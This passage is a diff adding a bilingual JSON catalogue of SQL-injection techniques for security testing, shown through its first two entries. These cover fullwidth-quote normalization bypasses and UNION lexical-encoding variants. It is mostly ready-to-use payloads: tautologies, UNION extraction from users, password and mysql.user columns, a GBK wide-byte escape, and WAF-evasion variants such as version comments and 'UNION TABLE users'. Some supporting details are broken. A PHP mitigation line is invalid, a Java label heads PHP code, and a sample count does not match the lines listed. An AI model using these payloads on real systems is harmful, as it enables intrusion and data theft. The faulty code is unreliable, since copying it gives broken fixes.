@@ -1,0 +1,2653 @@
+{
+  "schemaVersion": 1,
+  "contentStandard": 3,
+  "sourceIds": [
+    "httpbypass-unicode-sql",
+    "sqli2-union-extraction-lexical-encodings",
+    "xxe-file-read",
+    "ssti2-xxe-external-dtd-fetches",
+    "auth2-api",
+    "inject2-graphql",
+    "httpbypass-json-body"
+  ],
+  "entries": [
+    {
+      "id": "httpbypass-unicode-sql",
+      "name": {
+        "zh": "全角引号规范化绕过",
+        "en": "Fullwidth Quote Normalization Bypass"
+      },
+      "description": {
+        "zh": "使用全角引号和运算符检查输入层是否放行，而数据库驱动或预处理阶段将其转换为 SQL 元字符。",
+        "en": "Uses full-width quotes and operators to test whether input validation permits them while a later driver or preprocessing stage converts them into SQL metacharacters."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "编码与 WAF 等价变体",
+        "en": "Encoding & WAF Equivalents"
+      },
+      "tags": [
+        "httpbypass",
+        "unicode_sql"
+      ],
+      "prerequisites": [
+        {
+          "zh": "使用隔离数据库和合成 marker 行，固定输入编码、框架 normalization、驱动字符集与 SQL 审计。",
+          "en": "Use an isolated database and synthetic marker row, pinning input encoding, framework normalization, driver charset, and SQL auditing."
+        },
+        {
+          "zh": "(1)为全角引号/运算符构造结构相同的恒真、恒假和规范 ASCII 配对，参数位置与其他请求条件不变。",
+          "en": "Build structurally matched true, false, and canonical ASCII pairs for full-width quotes and operators, keeping parameter position and all other request conditions fixed."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "Unicode SQL注入",
+            "en": "Validation step 1 for Full-Width Quote SQL Injection Normalization"
+          },
+          "command": "＇ or ＇1＇=＇1\n＂ or ＂1＂=＂1\n＇ or ＇1＇=＇1＇--\n＂ or ＂1＂=＂1＂--\n＇ or ＇1＇=＇1＇#\n＂ or ＂1＂=＂1＂#\n＇ or ＇1＇=＇1＇/*\n＂ or ＂1＂=＂1＂/*\nadmin＇--\nadmin＂--\nadmin＇ #\nadmin＂ #\nadmin＇ /*\nadmin＂ /*\n＇ UNION SELECT NULL--\n＂ UNION SELECT NULL--\n＇ UNION SELECT NULL,NULL--\n＂ UNION SELECT NULL,NULL--\n＇ UNION SELECT NULL,NULL,NULL--\n＂ UNION SELECT NULL,NULL,NULL--\n＇ UNION SELECT NULL,NULL,NULL,NULL--\n＂ UNION SELECT NULL,NULL,NULL,NULL--\n＇ UNION SELECT NULL,NULL,NULL,NULL,NULL--\n＂ UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+          "description": {
+            "zh": "以全角引号变体替代 ASCII 引号构造恒真与 UNION 语句；服务端规范化后语句仍成立并出现真/假响应差异即确认 Unicode 规范化差异可利用。",
+            "en": "Substitute full-width quotes for ASCII quotes in tautologies and UNIONs; statements still holding after server normalization with true/false response differences confirm exploitable Unicode normalization."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "＇",
+              "explanation": {
+                "zh": "全角Unicode变体",
+                "en": "Fullwidth Unicode variant"
+              },
+              "type": "value"
+            },
+            {
+              "part": "--",
+              "explanation": {
+                "zh": "SQL行注释符",
+                "en": "SQL line comment"
+              },
+              "type": "comment"
+            },
+            {
+              "part": "#",
+              "explanation": {
+                "zh": "MySQL注释符",
+                "en": "MySQL comment marker"
+              },
+              "type": "comment"
+            },
+            {
+              "part": "UNION SELECT",
+              "explanation": {
+                "zh": "合并查询注入",
+                "en": "UNION SELECT injection"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "一个 Unicode 变体首次产生 marker 真/假差异后停止，不继续 UNION、目录枚举或数据读取。",
+          "en": "Stop after one Unicode variant first produces the marker true or false differential; do not continue to UNION, catalog enumeration, or data reads."
+        },
+        {
+          "zh": "回滚 marker 数据，删除请求/SQL trace，清除 normalization 缓存并恢复参数化与规范化后校验。",
+          "en": "Roll back marker data, delete request and SQL traces, clear normalization caches, and restore parameterization and post-normalization validation."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "全角字符 URL 编码",
+            "en": "URL-Encoded Fullwidth Characters"
+          },
+          "command": "%EF%BC%87+or+%EF%BC%871%EF%BC%9D%EF%BC%871",
+          "description": {
+            "zh": "绕过对半角元字符的过滤并利用归一化差异：全角引号等以 UTF-8 百分号编码传递，应用规范化后还原；数据库报错出现即成功。",
+            "en": "Send fullwidth quote/equals as UTF-8 percent encoding to exploit normalization gaps; an appearing database error confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%EF%BC%87",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "%EF%BC%9D",
+              "explanation": {
+                "zh": "全角等号编码",
+                "en": "Fullwidth equals encoding"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "修饰撇号变体",
+            "en": "Modifier Apostrophe Variant"
+          },
+          "command": "%CA%BC+or+1%3D1--",
+          "description": {
+            "zh": "绕过对标准引号字符集的封锁：用 U+02BC 修饰字母撇号参与规范化还原；谓词生效引发差异即成功。失效条件：无任何主流标准化层把 U+02BC 映射为撇号，仅在自研 normalize 映射表存在的应用成立，现代环境判 C。",
+            "en": "Use the U+02BC modifier apostrophe to survive quote charset bans via normalization; an effective predicate causing a delta confirms success. No mainstream normalization layer maps U+02BC to an apostrophe, so this only works in applications shipping a custom normalize table, rated C in modern environments."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%CA%BC",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "--",
+              "explanation": {
+                "zh": "SQL行注释符",
+                "en": "SQL line comment"
+              },
+              "type": "comment"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "title": {
+            "zh": "半全角混排",
+            "en": "Halfwidth-Fullwidth Mixing"
+          },
+          "command": "＇ or '1'='1",
+          "description": {
+            "zh": "绕过对全角串整体匹配的规则：半角全角混排使特征不完整；登录或查询行为异常即成功。失效条件：MySQL 不把 U+FF07 当引号，仅应用做全半角归一化或 GBK 转码时成立，现代环境判 C。",
+            "en": "Mix halfwidth and fullwidth so signatures never fully match; anomalous login or query behavior confirms success. MySQL never treats U+FF07 as a quote, so this needs full-to-half-width normalization or GBK conversion in the application, rated C in modern environments."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "＇",
+              "explanation": {
+                "zh": "全角Unicode变体",
+                "en": "Fullwidth Unicode variant"
+              },
+              "type": "value"
+            },
+            {
+              "part": "'1'='1",
+              "explanation": {
+                "zh": "字符串恒真比较",
+                "en": "String tautology"
+              },
+              "type": "payload"
+            }
+          ],
+          "effectiveness": "C"
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "宽字节引号逃逸（GBK 系连接）",
+            "en": "Wide-Byte Quote Escape (GBK Connection)"
+          },
+          "command": "%bf%27 OR 1=1-- -\n%bf%27 UNION SELECT 1,database(),3-- -",
+          "description": {
+            "zh": "连接字符集为 GBK/Big5/gb2312 且应用对输入做 addslashes 类转义时，%bf%27 的首字节 0xBF 与转义产生的反斜杠 0x5C 合并为一个合法多字节字符，吞掉转义使后随引号逃逸出字符串边界：第一行恒真条件应返回超出预期的行数，第二行 UNION 应回显当前库名。成立条件为应用连接层使用 GBK 系字符集且转义按字节进行；MySQL 8 默认 utf8mb4 连接下该合并不成立，可直接作为负样本对照。成功判据：第一行恒真条件生效或第二行回显 database()。",
+            "en": "When the application connection uses a GBK-family charset (GBK, Big5, gb2312) and escapes quotes with addslashes-style backslashes, the 0xBF lead byte of %bf%27 merges with the escaping backslash 0x5C into one legal multibyte character, swallowing the escape so the trailing quote leaves the string boundary. Line one should return more rows than the baseline through the always-true condition and line two should echo the current database name through the UNION. Preconditions: a GBK-family connection charset with byte-wise escaping; the merge does not occur on MySQL 8 default utf8mb4 connections, so the payload also serves as a negative control. Success: the always-true condition fires or database() is echoed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%bf%27",
+              "explanation": {
+                "zh": "URL 编码的 0xBF 0x27：GBK 下 0xBF 与前置转义反斜杠合成合法双字节字符，引号得以逃逸",
+                "en": "URL-encoded 0xBF 0x27: under GBK the 0xBF lead byte absorbs the preceding escape backslash, freeing the quote"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "OR 1=1-- -",
+              "explanation": {
+                "zh": "恒真条件快速判定注入是否成立，注释尾清空残余语法",
+                "en": "Always-true condition for a quick positivity check, with a comment tail clearing residual syntax"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "UNION SELECT 1,database(),3-- -",
+              "explanation": {
+                "zh": "三列 UNION 直接回显当前数据库名，证明逃逸后可继续取数",
+                "en": "Three-column UNION echoes the current database name, proving data access after the escape"
+              },
+              "type": "payload"
+            }
+          ],
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "建立Unicode SQL 元字符基线",
+            "en": "Establish the Unicode SQL Metacharacters baseline"
+          },
+          "description": {
+            "zh": "使用参数化测试查询记录普通文本、ASCII 引号和全角引号的数据库参数值与结果，并保存原始请求、响应与服务端关联标识。",
+            "en": "Record database parameter values and outcomes for plain text, ASCII quotes, and full-width quotes in a parameterized test query, retaining raw requests, responses, and server correlation identifiers."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行Unicode SQL 元字符变体",
+            "en": "Execute the Unicode SQL Metacharacters variants"
+          },
+          "description": {
+            "zh": "逐项提交原始 Unicode SQL 结构到授权测试字段，保持账号和查询条件一致，严格保持其他变量不变并设置停止阈值。",
+            "en": "Submit original Unicode SQL structures one at a time to an authorized test field while holding account and query conditions constant, holding all other variables constant and defining a stop threshold."
+          },
+          "payload": "＇ or ＇1＇=＇1\n＂ or ＂1＂=＂1\n＇ or ＇1＇=＇1＇--\n＂ or ＂1＂=＂1＂--\n＇ or ＇1＇=＇1＇#\n＂ or ＂1＂=＂1＂#\n＇ or ＇1＇=＇1＇/*\n＂ or ＂1＂=＂1＂/*\nadmin＇--\nadmin＂--\nadmin＇ #\nadmin＂ #\nadmin＇ /*\nadmin＂ /*\n＇ UNION SELECT NULL--\n＂ UNION SELECT NULL--\n＇ UNION SELECT NULL,NULL--\n＂ UNION SELECT NULL,NULL--\n＇ UNION SELECT NULL,NULL,NULL--\n＂ UNION SELECT NULL,NULL,NULL--\n＇ UNION SELECT NULL,NULL,NULL,NULL--\n＂ UNION SELECT NULL,NULL,NULL,NULL--\n＇ UNION SELECT NULL,NULL,NULL,NULL,NULL--\n＂ UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+        },
+        {
+          "title": {
+            "zh": "核验全角引号 SQL 注入规范化证据",
+            "en": "Verify evidence for Full-Width Quote SQL Injection Normalization"
+          },
+          "description": {
+            "zh": "通过数据库审计与结果差异确认字符被规范化后改变了 SQL 语法结构；同时排除应用错误、字符被当作普通数据、WAF 命中或仅响应编码变化。",
+            "en": "Confirm through database audit and result differences that character normalization changes SQL syntax structure; also exclude Application errors, characters treated as ordinary data, WAF matches, or response-encoding changes only."
+          }
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+        "https://www.unicode.org/reports/tr39/"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "覆盖全角引号 SQL 元字符的规范化验证：以全角引号变体替代 ASCII 引号构造恒真与 UNION 语句，检测输入层放行而数据库驱动或预处理阶段转换为 SQL 元字符的差异。",
+          "en": "Covers normalization verification of fullwidth-quote SQL metacharacters: building always-true and UNION statements with fullwidth-quote variants replacing ASCII quotes, detecting differentials where the input layer passes them while the driver or preprocessing converts them into SQL metacharacters."
+        },
+        "vulnerability": {
+          "zh": "根因是过滤器在规范化前检查而后续层把全角字符映射为 ASCII 引号，拼接 SQL 的应用出现注入；判定标准是数据库审计与结果差异证明规范化改变了 SQL 语法结构。",
+          "en": "The root cause is filters inspecting before normalization while later layers map fullwidth characters to ASCII quotes, producing injection in SQL-concatenating applications; the decision standard is database audit and result differentials proving normalization changed SQL syntax structure."
+        },
+        "exploitation": {
+          "zh": "使用第 1 步命令以全角引号变体替代 ASCII 引号构造恒真与 UNION 语句；服务端规范化后语句仍成立并出现真/假响应差异即确认 Unicode 规范化差异可利用。先用参数化测试查询记录普通文本、ASCII 引号与全角引号的参数值与结果，再逐项提交到授权测试字段并保持查询条件一致。",
+          "en": "Use the step 1 command to build always-true and UNION statements with fullwidth-quote variants replacing ASCII quotes; statements still standing with true/false response differences after server-side normalization confirm the exploitable Unicode normalization differential. Record parameter values and results for plain text, ASCII quotes, and fullwidth quotes with parameterized test queries first, then submit item by item to authorized test fields under identical query conditions."
+        },
+        "mitigation": {
+          "zh": "全部查询参数化，禁止拼接输入；在统一 Unicode 规范化后再执行类型与长度校验，并为兼容字符映射建立回归测试。Java：\n    try (PreparedStatement ps = conn.prepareStatement(\n        \"SELECT id FROM users WHERE name = ?\")) {\n      ps.setString(1, name);\n    }\n    $st = $pdo->prepare(\"SELECT id FROM users WHERE name = ?\");\n    $st->execute([$name]);",
+          "en": "Use parameterized statements for all queries, forbidding concatenation; run type and length validation after unified Unicode normalization; build regression tests over compatibility character mappings and database charsets."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "阳性要求入口校验接受全角变体，后续层将其转换为 SQL 元字符并让恒真/恒假结果稳定分离或返回 marker，数据库审计显示查询结构改变。数据库把全角字符当普通数据、语法错误、输入回显、应用只规范化显示、WAF 放行但参数化仍安全或一次响应差异都属于假阳性。",
+        "en": "Positive evidence requires entry validation to accept a full-width variant, a later tier to convert it into SQL metacharacters, and matched true and false results to separate or return the marker, with database auditing showing query-structure change. Treating full-width characters as data, syntax errors, reflection, display-only normalization, WAF acceptance with safe parameterization, or one response difference is a false positive."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF1 批次3：按报告 §6 候选1 追加 宽字节引号逃逸（GBK 系连接） 变体（原 3 条下标不变、不重排不删除，新变体追加在末尾）。"
+      }
+    },
+    {
+      "id": "sqli2-union-extraction-lexical-encodings",
+      "name": {
+        "zh": "UNION 词法编码与分词变体",
+        "en": "UNION Lexical Encoding & Tokenization Variants"
+      },
+      "description": {
+        "zh": "使用注释、换行、垂直制表、双重编码、大小写和括号变体验证 UNION 查询在多层规范化后的语义。",
+        "en": "Uses comments, line breaks, vertical tabs, double encoding, case changes, and parentheses to test UNION query semantics after multilayer normalization."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "编码与 WAF 等价变体",
+        "en": "Encoding & WAF Equivalents"
+      },
+      "tags": [
+        "sqli",
+        "union",
+        "encoding",
+        "comment"
+      ],
+      "prerequisites": [
+        {
+          "zh": "输入可能进入支持 UNION 的关系型数据库查询",
+          "en": "Input may enter a relational query that supports UNION."
+        },
+        {
+          "zh": "使用只含测试数据的数据库副本并可审计最终 SQL",
+          "en": "A database copy with test-only data and auditable final SQL is available."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "UNION 与编码执行样例",
+            "en": "UNION and Encoding Execution Samples"
+          },
+          "command": "id2='union all select * from users--\n%C0%80'+union+select+col1,col2,col3+from+table+--+\n' union select current_user, 2#\n0 union/**/select 1,version(),@@datadir\n1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-\namUserId=1 union select username,password,3,4 from users\n%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201\n%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29\n%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201",
+          "description": {
+            "zh": "按已确认数据库方言逐条应用到测试查询，并把表、列和用户目标改为测试对象；记录应用解码后 SQL 与结果列对齐。",
+            "en": "Apply lines individually for the confirmed dialect, replace table, column, and user targets with test objects, and record decoded SQL and result-column alignment."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "union all select",
+              "explanation": {
+                "zh": "合并查询注入",
+                "en": "UNION SELECT injection"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "current_user",
+              "explanation": {
+                "zh": "当前用户函数",
+                "en": "Current user function"
+              },
+              "type": "function"
+            },
+            {
+              "part": "mysql.user",
+              "explanation": {
+                "zh": "账户权限表",
+                "en": "Account privilege table"
+              },
+              "type": "value"
+            },
+            {
+              "part": "like",
+              "explanation": {
+                "zh": "模式匹配谓词",
+                "en": "LIKE pattern predicate"
+              },
+              "type": "control"
+            },
+            {
+              "part": "information_schema.tables",
+              "explanation": {
+                "zh": "元数据系统表",
+                "en": "Metadata system table"
+              },
+              "type": "value"
+            },
+            {
+              "part": "limit",
+              "explanation": {
+                "zh": "行数限制子句",
+                "en": "Row limit clause"
+              },
+              "type": "control"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "所有 users、password、mysql.user 等目标替换为只含伪数据的测试表。",
+          "en": "Replace users, password, mysql.user, and similar targets with test tables containing synthetic data."
+        },
+        {
+          "zh": "每次仅尝试一个与已确认方言匹配的变体并限制响应行数。",
+          "en": "Try one confirmed-dialect variant at a time and limit result rows."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "边界规范化复测集合",
+            "en": "Edge Normalization Retest Set"
+          },
+          "command": "' union select current_user, 2#",
+          "description": {
+            "zh": "保留原集合中的全部 UNION 复测行，用于对比边界和数据库的解码/分词；它们不是通用 WAF 绕过保证。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Preserves every original UNION retest line for comparing edge and database decoding or tokenization; the lines are not a universal WAF-bypass guarantee. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "union all select",
+              "explanation": {
+                "zh": "合并查询注入",
+                "en": "UNION SELECT injection"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "current_user",
+              "explanation": {
+                "zh": "当前用户函数",
+                "en": "Current user function"
+              },
+              "type": "function"
+            },
+            {
+              "part": "mysql.user",
+              "explanation": {
+                "zh": "账户权限表",
+                "en": "Account privilege table"
+              },
+              "type": "value"
+            },
+            {
+              "part": "like",
+              "explanation": {
+                "zh": "模式匹配谓词",
+                "en": "LIKE pattern predicate"
+              },
+              "type": "control"
+            },
+            {
+              "part": "information_schema.tables",
+              "explanation": {
+                "zh": "元数据系统表",
+                "en": "Metadata system table"
+              },
+              "type": "value"
+            },
+            {
+              "part": "limit",
+              "explanation": {
+                "zh": "行数限制子句",
+                "en": "Row limit clause"
+              },
+              "type": "control"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "control"
+        },
+        {
+          "title": {
+            "zh": "WAF 绕过：规范化变体集合",
+            "en": "Normalization Variant Collection"
+          },
+          "command": "/*!50000SELECT*/1--\n/*!UNION*//*!SELECT*/1,2,3--\n%55NION %53ELECT 1,2,3--\nuni/**/on sel/**/ect 1,2,3--\nunio%6e selec%74 1,2,3--\n1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--\n1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'",
+          "description": {
+            "zh": "以版本注释、URL 编码、注释分词等规范化变体提交恒真 UNION；语句仍执行并返回结果即确认对应规范化差异可绕过检测。",
+            "en": "Submit tautological UNIONs through version-comment, URL-encoding, and comment-tokenization normalization variants; the statement still executing and returning results confirms each normalization difference evades detection."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "--",
+              "explanation": {
+                "zh": "SQL行注释符",
+                "en": "SQL line comment"
+              },
+              "type": "comment"
+            },
+            {
+              "part": "uni/**/on",
+              "explanation": {
+                "zh": "合并查询注入",
+                "en": "UNION SELECT injection"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "dual",
+              "explanation": {
+                "zh": "Oracle哑表",
+                "en": "Oracle DUAL table"
+              },
+              "type": "value"
+            },
+            {
+              "part": "OR 1=1",
+              "explanation": {
+                "zh": "恒真布尔条件",
+                "en": "Tautology condition"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "||",
+              "explanation": {
+                "zh": "字符串连接符",
+                "en": "Concatenation operator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "SLEEP(5",
+              "explanation": {
+                "zh": "延迟等待函数",
+                "en": "Sleep delay function"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "基线对照：无 WAF 直连复测样例",
+            "en": "Baseline control: normalization bypass patterns"
+          },
+          "command": "id2='union all select * from users--\n%C0%80'+union+select+col1,col2,col3+from+table+--+\n' union select current_user, 2#\n0 union/**/select 1,version(),@@datadir\n1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-\namUserId=1 union select username,password,3,4 from users\n%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201\n%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29\n%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201",
+          "description": {
+            "zh": "与 execution[0] 逐字节相同，作为无 WAF 场景的对照组：先确认 7 条样例直连时的行为与判定依据，再叠加 WAF 复测对比拦截与放行差异；本条不提供额外绕过变体。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Byte-identical to execution[0]; serves as the no-WAF control group: confirm how the 7 samples behave when directly connected, then retest behind the WAF to compare blocking differences. This entry adds no extra bypass variant. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "--",
+              "explanation": {
+                "zh": "SQL行注释符",
+                "en": "SQL line comment"
+              },
+              "type": "comment"
+            },
+            {
+              "part": "uni/**/on",
+              "explanation": {
+                "zh": "合并查询注入",
+                "en": "UNION SELECT injection"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "dual",
+              "explanation": {
+                "zh": "Oracle哑表",
+                "en": "Oracle DUAL table"
+              },
+              "type": "value"
+            },
+            {
+              "part": "OR 1=1",
+              "explanation": {
+                "zh": "恒真布尔条件",
+                "en": "Tautology condition"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "||",
+              "explanation": {
+                "zh": "字符串连接符",
+                "en": "Concatenation operator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "SLEEP(5",
+              "explanation": {
+                "zh": "延迟等待函数",
+                "en": "Sleep delay function"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "control"
+        },
+        {
+          "title": {
+            "zh": "边界分词复测",
+            "en": "Edge Tokenization Retest"
+          },
+          "command": "0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user",
+          "description": {
+            "zh": "保留原集合中的重复复测行，修复后分别验证边界规范化和数据库分词。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Preserves the original duplicate retest line for separate post-fix verification of edge normalization and database tokenization. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%23",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "%0D%0A",
+              "explanation": {
+                "zh": "URL百分号编码",
+                "en": "URL percent encoding"
+              },
+              "type": "value"
+            },
+            {
+              "part": "current_user",
+              "explanation": {
+                "zh": "当前用户函数",
+                "en": "Current user function"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "control"
+        },
+        {
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "title": {
+            "zh": "MySQL 8 TABLE 语句与嵌套注释差分",
+            "en": "MySQL 8 TABLE Statement and Nested Comment Differential"
+          },
+          "command": "1' UNION TABLE users-- -\n1' UNI/*/**/*/ON SEL/*/**/*/ECT 1,database(),3-- -",
+          "description": {
+            "zh": "第一行以 MySQL 8.0.19+ 的 TABLE 语句替代 SELECT 列清单，多数 WAF 关键字规则表不含裸 TABLE 关键字，回显 users 全表或以列数错误证明语句已被执行。第二行用 /*/**/*/ 嵌套注释拆分 UNION 与 SELECT：对做单遍注释剥离的自研清洗器会残留 */ 并改变后续 token 流形成放行差分；对规范解析器（MySQL、CRS）无效，预期被拦。成立条件：首行为 MySQL≥8.0.19，次行为单遍注释剥离架构。成功判据：第一行回显 users 全表或报列数错；第二行仅在自研剥离器环境产生放行差异。",
+            "en": "Line one swaps the SELECT column list for the MySQL 8.0.19+ TABLE statement, whose bare TABLE keyword is absent from most WAF keyword rule sets; echoing the full users table or raising a column-count error proves the statement executed. Line two splits UNION and SELECT with /*/**/*/ nested comments: a single-pass comment stripper leaves a residual */ that shifts the following token stream and opens a pass differential, while a spec-compliant parser (MySQL, CRS) still rejects it. Preconditions: MySQL 8.0.19+ for line one, a single-pass stripping architecture for line two. Success: the first line dumps users or errors on column count, and the second line only passes on single-pass strippers."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "UNION TABLE users-- -",
+              "explanation": {
+                "zh": "MySQL 8 TABLE 语句整表直出，无需列清单，规则表通常缺该关键字",
+                "en": "The MySQL 8 TABLE statement dumps a whole table without a column list and is missing from most rule sets"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/*/**/*/",
+              "explanation": {
+                "zh": "嵌套注释对：单遍剥离器剥离外层后残留 */，扰乱后续 token 流",
+                "en": "Nested comment pair: a single-pass stripper leaves a residual */ that corrupts later tokenization"
+              },
+              "type": "payload"
+            }
+          ],
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "建立查询与列数基线",
+            "en": "Establish query and column-count baselines"
+          },
+          "description": {
+            "zh": "用合法测试查询和常量列记录最终 SQL、返回列与错误行为。",
+            "en": "Use a valid test query and constant columns to record final SQL, returned columns, and error behavior."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "提交方言匹配的词法变体",
+            "en": "Submit a dialect-matching lexical variant"
+          },
+          "description": {
+            "zh": "一次选择一行，替换为测试表和固定标记，并保留每层解码值。",
+            "en": "Select one line at a time, point it to a test table and fixed marker, and retain decoded values at every layer."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "确认数据库结果合并",
+            "en": "Confirm database result merging"
+          },
+          "description": {
+            "zh": "匹配测试标记、最终 SQL 与数据库审计，排除错误页、缓存和字符串回显。",
+            "en": "Match test marker, final SQL, and database audit, excluding error pages, caching, and string reflection."
+          },
+          "payload": "/*!50000SELECT*/1--\n/*!UNION*//*!SELECT*/1,2,3--\n%55NION %53ELECT 1,2,3--\nuni/**/on sel/**/ect 1,2,3--\nunio%6e selec%74 1,2,3--\n1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--\n1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'"
+        },
+        {
+          "title": {
+            "zh": "参数化并回归编码矩阵",
+            "en": "Parameterize and regress the encoding matrix"
+          },
+          "description": {
+            "zh": "固定查询结构后重放合法输入及全部词法变体，确认只有数据参数进入查询。",
+            "en": "After fixing query structure, replay valid input and all lexical variants to confirm only data parameters reach the query."
+          },
+          "payload": ""
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+        "https://owasp.org/www-community/attacks/SQL_Injection"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "覆盖 UNION 提取的词法编码变体验证：以注释、换行、垂直制表、双重编码、大小写与括号变体提交 UNION 查询，检测各层规范化后语义是否保持。",
+          "en": "Covers lexical-encoding variant verification for UNION extraction: submitting UNION queries via comment, newline, vertical-tab, double-encoding, case, and parenthesis variants, testing whether semantics survive per-layer normalization."
+        },
+        "vulnerability": {
+          "zh": "根因是不可信输入被拼接进查询结构而安全控制依赖原始字符串匹配；应用和数据库在额外解码、注释处理或空白折叠后恢复 UNION/SELECT 语义，参数与查询语法边界被突破。",
+          "en": "The root cause is untrusted input concatenated into query structure while security controls match raw strings; applications and databases restore UNION/SELECT semantics after extra decoding, comment handling, or whitespace folding, breaching the parameter and query-syntax boundary."
+        },
+        "exploitation": {
+          "zh": "使用第 1 步命令按已确认数据库方言逐条把编码变体应用到测试查询，并把表、列与用户目标改为测试对象；记录应用解码后 SQL 与结果列对齐情况。先以常量测试列确定列数和回显位置，再只选择目标方言的一行指向测试表，关联请求、规范化后 SQL、数据库审计与固定标记结果。",
+          "en": "Use the step 1 command to apply encoding variants to test queries per the confirmed database dialect, swapping table, column, and user targets for test objects; record post-decode SQL and result column alignment. Fix column count and echo positions with constant test columns first, then pick only the target dialect's row against test tables, correlating requests, normalized SQL, database audit, and fixed-marker results."
+        },
+        "mitigation": {
+          "zh": "参数化查询与固定查询结构，动态排序/列名经服务端允许列表映射；边界统一解码一次但不依赖 WAF 修复注入，账户最小权限。\n    // PHP：标识符白名单 + 参数化\n    $SORT = [\"name\" => \"name\", \"date\" => \"created_at\"];\n    $col = $SORT[$sortKey] ? \"id\";\n    $st = $pdo->prepare(\"SELECT id, {$col} FROM items WHERE uid = ? LIMIT 10\");\n    $st->execute([$uid]);",
